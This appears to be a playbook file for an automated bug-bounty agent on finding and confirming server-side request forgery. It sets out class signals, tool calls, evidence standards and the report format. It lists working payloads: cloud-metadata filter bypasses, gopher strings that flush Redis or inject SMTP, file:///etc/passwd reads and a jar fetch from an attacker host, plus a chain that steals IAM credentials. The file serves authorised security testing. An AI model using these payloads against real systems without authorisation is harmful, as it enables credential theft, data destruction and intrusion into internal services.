---
description: SSRF deep-dive — classification matrix, bypass primitives per class, evidence ladder, save_finding shape. Load when a finding or recon turns up an SSRF candidate.
globs:
---

# SSRF Deep-Dive Playbook

Load when: a parameter accepts a URL / hostname / file path AND the server fetches it, OR `auto_probe` flags an `ssrf` class hit, OR you're hunting in scope categories that pay for SSRF chains (cloud / fintech / SaaS APIs).

## SMART MOVE — first call

- target runs on AWS / GCP / Azure → `test_cloud_metadata(url, parameter)` first (CRITICAL severity ceiling — direct IMDS hit ends the engagement on this finding)
- inline filter blocks `127.0.0.1` / `169.254.x` literal but accepts arbitrary hostname → `probe_dns_rebind(url, parameter)` (rbndr.us TOCTOU with IMDS markers)
- blind class (body shape unchanged regardless of target) → `auto_collaborator_test(url, parameter)` — generates real Collaborator subdomain, no fabricated callbacks (R9a)
- protocol smuggling suspected (URL parser accepts arbitrary scheme) → manual `gopher://` / `dict://` / `file://` / `jar://` / `phar://` + Collaborator
- generic 5-axis survey → `test_ssrf(url, parameter, use_collaborator=True)`
- edge-worker class (Cloudflare Worker / Lambda@Edge / Fastly) → KB `edge_worker_ssrf.json` matchers via `auto_probe`

## SSRF classification matrix

Identify the class first — payload + evidence bar + severity all change.

| Class | Signal in baseline | Confirmation | Severity ceiling |
|---|---|---|---|
| **Cloud metadata SSRF** | Param accepts URL; baseline doesn't sanitise localhost / 169.254.x | Body contains IMDS markers (`ami-id`, `instance-id`, `AccessKeyId`, `subscriptionId`, `computeMetadata`) | CRITICAL |
| **Internal-service SSRF** | Param accepts URL; localhost / RFC1918 reachable | Status / length / banner divergence vs unreachable port | HIGH |
| **Protocol-smuggling SSRF** | URL parser accepts `gopher://` / `dict://` / `file://` / `jar://` / `phar://` / `netdoc://` | Protocol-specific payload reaches downstream (Redis OK, file dump, deserialization) | CRITICAL |
| **Blind SSRF** | Param fetches URL; response shape unchanged regardless of target | Collaborator interaction (DNS / HTTP) | HIGH |
| **DNS-rebind SSRF** | Inline filter blocks 127.0.0.1 / 169.254.x literal but accepts arbitrary hostname | Hostname A-record flips between attacker-controlled IP and internal IP across rapid TTL | HIGH |
| **Edge-worker SSRF** | Param consumed by Cloudflare Worker / Fastly Compute / Lambda@Edge with bind to internal services | Reach inter-service endpoint not exposed publicly | CRITICAL |

## Tool selection per class

- **Inline / fast survey:** `test_ssrf(url, parameter, use_collaborator=True)` — 5-axis sweep (internal IPs / cloud / protocols / headers / DNS-rebind).
- **Cloud metadata explicit:** `test_cloud_metadata(session, parameter, path)` — AWS IMDSv1+v2 / GCP / Azure / DO / OCI / Alibaba.
- **Edge-worker class:** active KB `edge_worker_ssrf` via `auto_probe(categories=['edge_worker_ssrf'])`.
- **Blind / OOB only:** `generate_collaborator_payload()` → inject → wait 15s → `get_collaborator_interactions()`.

## Bypass primitives (chain when initial probe blocked)

W8 added 2025 bypass primitives to `ssrf.cloud_metadata_2025_bypass`. When the obvious literal `http://169.254.169.254/` is blocked:

```
http://169.254.169.254.nip.io/latest/meta-data/    # DNS resolver bypass
http://[::ffff:a9fe:a9fe]/latest/meta-data/        # IPv4-mapped IPv6
http://0177.0.0.1/latest/meta-data/                # octal encoding
http://2852039166/latest/meta-data/                # decimal IP
http://0xa9fea9fe/latest/meta-data/                # hex IP
http://169.254.169.254%23.attacker.tld/...         # URL-fragment injection
http://attacker.tld@169.254.169.254/...            # userinfo split
http://169.254.169.254:80@attacker.tld/...         # port-vs-host parser split
```

For IMDSv2 (token-required AWS), the SSRF must support PUT or arbitrary headers (`X-aws-ec2-metadata-token-ttl-seconds`).

## Protocol-smuggling payload set

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a          # Redis flush
gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM:%3Cx%40x%3E... # SMTP injection
file:///etc/passwd                                                # file read
jar:http://attacker/x!/                                           # Java jar fetch
netdoc://...                                                      # Java legacy
phar://upload.phar/test.txt                                       # PHP deserial
```

`ssrf_protocol` KB is the canonical reference.

## Evidence ladder

| Verdict | Evidence shape | logger_index | OOB | Save? |
|---|---|---|---|---|
| **CONFIRMED CRITICAL** | Cloud metadata markers in body (`AccessKeyId` / `instance-id` / `computeMetadata`) | required | optional | yes |
| **CONFIRMED HIGH** | Internal-service banner reflected (SSH, Redis -ERR, MySQL handshake) | required | optional | yes |
| **CONFIRMED HIGH (blind)** | Collaborator DNS+HTTP hit within poll window | optional | **required** + 3 replays | yes |
| **SUSPECTED** | Status / length delta vs unreachable port baseline | required | — | NO — escalate first |
| **FAILED** | Same baseline regardless of target | required | — | NO |

Rule 10 enforcement: blind SSRF without Collaborator is unverifiable. Don't claim CONFIRMED.

## save_finding shape

```python
save_finding(
    vuln_type="ssrf",
    endpoint="...",
    parameter="url",
    severity="critical",                                  # cloud metadata = critical
    evidence={
        "logger_index": <replay-confirming index>,
        "collaborator_interaction_id": "<id>",            # blind class
        "baseline_status": 200,
        "baseline_length": 1234,
        "summary": "SSRF to AWS IMDS — AccessKeyId reflected from /latest/meta-data/iam/security-credentials/role-name",
        "reproductions": [                                # blind class only
            {"logger_index": ..., "elapsed_ms": ..., "status_code": ...},
            ...
        ],
    },
    cvss4_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:A",
)
```

## Chain patterns (severity multiplier)

Per `chain-findings.md`:

- **SSRF → cloud metadata → IAM creds → cross-service pivot** = $$$ (XBOW's 48-step SSRF chain class).
- **SSRF + open redirect (OAuth `redirect_uri`)** = OAuth code theft → ATO.
- **SSRF + parameter pollution** = bypass URL parser sanity checks.
- **SSRF → internal admin panel → RCE** = CVE-class chain.

## Severity discipline

- Reflected `<html>` from `http://example.com/` via the SSRF parameter = NOT SSRF (the server is acting as a proxy by design). Reproduce against `http://127.0.0.1/` or RFC1918 to confirm internal reach.
- `?url=http://attacker.com/` returning 200 = NOT SSRF unless attacker host shows the Burp Collaborator interaction or the body contains attacker-controlled content reflected via the proxy.
- Open redirect ≠ SSRF. The server fetches vs redirects to is the distinction.

## NEVER_SUBMIT trap

SSRF on a fetch-from-URL feature that's intentionally exposed (image-proxy / link-preview / webhook tester) with sufficient SSRF defences (no localhost / no RFC1918 / no metadata) — even if you can hit `evil.com` — is NOT a vulnerability. Verify the defence layer before submitting.

## Related

- `knowledge/ssrf.json`, `knowledge/ssrf_bypass.json`, `knowledge/ssrf_protocol.json` — payload sets
- `knowledge/edge_worker_ssrf.json` — Cloudflare Worker / Fastly Compute class
- `test_ssrf` + `test_cloud_metadata` — VerdictResult-returning probes (W10)
- `chain-findings.md` — SSRF → IAM cred theft progression
- Rule 9a — Collaborator-only for blind testing
